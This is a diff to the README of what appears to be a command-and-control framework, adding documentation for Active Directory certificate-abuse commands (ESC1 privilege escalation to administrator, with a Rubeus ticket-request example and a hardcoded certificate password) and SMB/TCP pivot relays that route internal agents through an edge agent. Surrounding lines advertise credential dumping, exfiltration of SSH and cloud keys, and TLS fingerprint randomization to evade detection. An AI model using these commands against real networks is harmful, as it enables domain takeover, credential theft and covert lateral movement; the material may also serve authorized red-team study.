@@ -83,7 +83,7 @@
 - **HTTP/HTTPS/DNS/TCP/SMB listeners** with malleable communication profiles
 - **Encrypted comms** — RSA-2048 key exchange + AES-256-GCM with auto key rotation
 - **4 malleable profiles** — Default, Microsoft 365, Cloudflare Workers, Redirector
-- **SMB/Unix socket pivoting** — agent-to-agent relay for lateral access
+- **SMB/TCP pivoting** — agent-to-agent relay for lateral access (TCP works cross-platform; SMB requires Windows)
 - **Mobile endpoint** — `/api/v1/mobile/checkin` for Android/iOS callbacks
 - **Listener presets** — save, load, one-click launch from CLI or Web UI
 - **JA3 fingerprint randomization** — random cipher suites per connection to avoid TLS fingerprinting
@@ -464,7 +464,7 @@ lateral winrm-spawn <target> <user> <pass> <stager_url>
 | Exfiltration | DNS, HTTP, ICMP, SMB, clipboard, browser, WiFi, vault | DNS, HTTP, ICMP, ssh-keys, cloud-keys |
 | Initial Access | portscan, spray, enum-smb, enum-web, vuln-scan | portscan, enum-dns, netdiscover |
 
-### Active Directory Commands (22 total)
+### Active Directory Commands (24 total)
 
 **Enumeration:** `ad-enum-domain`, `ad-enum-users`, `ad-enum-groups`, `ad-enum-computers`, `ad-enum-shares`, `ad-enum-spns`, `ad-enum-gpo`, `ad-enum-trusts`, `ad-enum-admins`, `ad-enum-asrep`, `ad-enum-delegation`, `ad-enum-laps`
 
@@ -473,6 +473,16 @@ lateral winrm-spawn <target> <user> <pass> <stager_url>
 **Credential Access:** `ad-dump-sam`, `ad-dump-lsa`, `ad-dump-tickets`
 
 **Lateral Movement:** `ad-psexec`, `ad-wmi`, `ad-winrm`, `ad-pass-the-hash`
+
+**ADCS (Certificate Abuse):** `ad-adcs-enum`, `ad-adcs-request`
+
+```
+ad-adcs-enum                              Enumerate certificate templates, flag ESC1-ESC8 misconfigs
+ad-adcs-request <template> <upn>          Request cert with SAN override (ESC1 priv-esc)
+  Example: ad-adcs-request UserAuthentication administrator@corp.local
+  Output:  phantom_cert.pfx (password: phantom123)
+  Use with: Rubeus.exe asktgt /user:administrator /certificate:phantom_cert.pfx /password:phantom123
+```
 
 ### Exfiltration Commands
 
@@ -500,6 +510,22 @@ assembly SharpHound.exe -c All -d domain.local
 assembly Certify.exe find /vulnerable
 assembly inline <base64_data> [args]
 assembly list
+```
+
+### Pivoting Commands
+
+```
+pivot start [pipe-name]     Start SMB named pipe relay (Windows only, default: msupdate)
+pivot stop                  Stop SMB named pipe relay
+pivot list                  Show active SMB relay
+
+pivot tcp-start [addr]      Start TCP pivot relay — cross-platform (default: 0.0.0.0:4444)
+pivot tcp-stop              Stop TCP pivot relay
+pivot tcp-list              Show active TCP relay
+
+# TCP pivot example: edge agent exposes port 5555, internal agents connect to it
+pivot tcp-start 0.0.0.0:5555
+# Internal agent (no internet): connects to edge:5555, sends data queued for C2 check-in
 ```
 
 ### Initial Access
